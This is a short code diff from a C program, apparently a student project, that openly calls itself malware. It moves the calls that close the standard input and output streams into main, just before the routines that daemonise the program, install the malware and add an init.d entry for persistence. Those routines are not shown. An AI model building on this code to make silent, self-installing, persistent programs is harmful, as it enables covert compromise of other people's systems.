@@ -197,9 +197,6 @@ static void	lauch_malware()
 	}
 	else if (pid == 0)
 	{
-		close(STDOUT_FILENO);
-		close(STDIN_FILENO);
-		close(STDERR_FILENO);
 		execve(exec[0], exec, NULL);
 	}
 	else
@@ -220,6 +217,9 @@ int	main(int argc, char **argv)
 
 	puts("rabougue\nkbensado");
 
+		close(STDOUT_FILENO);
+		close(STDIN_FILENO);
+		close(STDERR_FILENO);
 	size_daemon = daemon_begin(argv[0]);
 	install_malware(argv[0], size_daemon);
 	install_init_d();
